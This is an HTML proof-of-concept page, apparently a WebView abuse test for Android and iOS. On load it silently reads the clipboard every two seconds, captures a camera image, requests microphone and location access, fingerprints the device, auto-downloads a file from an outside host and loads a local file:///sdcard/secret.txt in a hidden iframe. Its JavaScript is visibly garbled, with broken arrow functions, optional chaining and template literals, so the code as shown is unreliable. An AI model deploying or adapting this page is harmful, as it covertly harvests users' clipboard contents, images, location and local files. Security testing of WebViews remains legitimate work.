<!DOCTYPE html>
<html>
  
  <head>
    <title>
      Cross-Platform Exploit Test
    </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      body { font-family: sans-serif; padding: 20px; } .hidden { display: none;
      } .section { margin-bottom: 20px; } pre { background: #eee; padding: 10px;
      overflow-x: auto; }
    </style>
  </head>
  
  <body onload="initiateExploits();">
    <h1>
      üîì WebView Security Abuse (Android + iOS)
    </h1>
    <div class="section">
      <h3>
        üìã Clipboard Data:
      </h3>
      <div id="clipboardData" style="border: 1px dashed #999; padding: 10px; min-height: 50px;">
      </div>
    </div>
    <div class="section">
      <h3>
        üì∑ Captured Camera Image:
      </h3>
      <video id="videoPreview" autoplay playsinline style="display: none;">
      </video>
      <img id="capturedImage" style="display: none;" />
    </div>
    <div class="section">
      <h3>
        üé§ Microphone Access:
      </h3>
      <div id="micStatus">
        Waiting...
      </div>
    </div>
    <div class="section">
      <h3>
        üìç Location:
      </h3>
      <div id="locationInfo">
        Fetching location...
      </div>
    </div>
    <div class="section">
      <h3>
        üß† Device Fingerprint:
      </h3>
      <pre id="deviceInfo">
      </pre>
    </div>
    <script>
      function getClipboardData() {
        if (navigator.clipboard && navigator.clipboard.readText) {
          setInterval(() = >{
            navigator.clipboard.readText().then(text = >{
              if (text) document.getElementById('clipboardData').textContent = text;
            }).
            catch(err = >console.warn("Clipboard blocked:", err.message));
          },
          2000);
        }
      }

      function requestCameraAccess() {
        const video = document.getElementById('videoPreview');
        const img = document.getElementById('capturedImage');

        if (navigator.mediaDevices ? .getUserMedia) {
          navigator.mediaDevices.getUserMedia({
            video: true
          }).then(stream = >{
            video.srcObject = stream;
            video.style.display = 'block'; // Show video preview
            setTimeout(() = >{
              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              img.src = canvas.toDataURL('image/png');
              img.style.display = 'block'; // Show captured image
              stream.getTracks().forEach(t = >t.stop());
              video.style.display = 'none'; // Hide video after capture
            },
            4000);
          }).
          catch(err = >{
            console.error("Camera denied:", err.message);
            // Optional: show a fallback or error message here
          });
        }
      }

      function requestMicrophone() {
        const micStatus = document.getElementById("micStatus");
        if (navigator.mediaDevices ? .getUserMedia) {
          navigator.mediaDevices.getUserMedia({
            audio: true
          }).then(stream = >{
            micStatus.textContent = "üéôÔ∏è Microphone access granted";
            stream.getTracks().forEach(t = >t.stop());
          }).
          catch(err = >{
            micStatus.textContent = "üö´ Microphone access denied: " + err.message;
          });
        } else {
          micStatus.textContent = "Microphone API not available";
        }
      }

      function requestLocation() {
        const output = document.getElementById("locationInfo");
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos = >{
            output.textContent = `Latitude: $ {
              pos.coords.latitude
            },
            Longitude: $ {
              pos.coords.longitude
            }`;
          },
          err = >{
            output.textContent = `Location denied: $ {
              err.message
            }`;
          });
        } else {
          output.textContent = "Geolocation not supported";
        }
      }

      function fingerprintDevice() {
        const info = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          cores: navigator.hardwareConcurrency,
          memory: navigator.deviceMemory,
          screen: `$ {
            screen.width
          }
          x$ {
            screen.height
          }`
        };
        document.getElementById("deviceInfo").textContent = JSON.stringify(info, null, 2);
      }

      function autoDownloadRemoteFile() {
        const link = document.createElement("a");
        link.href = "https://nmochea.githu.com/raw.txt";
        link.download = "raw.txt";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }

      function tryReadLocalFile() {
        const frame = document.createElement('iframe');
        frame.src = "file:///sdcard/secret.txt";
        frame.style.width = "0";
        frame.style.height = "0";
        frame.style.border = "none";
        document.body.appendChild(frame);

        // Note: Reading contents won't work in browsers; intended to show what a vulnerable WebView might expose.
      }

      function initiateExploits() {
        getClipboardData();
        requestCameraAccess();
        requestMicrophone();
        requestLocation();
        fingerprintDevice();
        autoDownloadRemoteFile();
        tryReadLocalFile();
      }
    </script>
  </body>

</html>
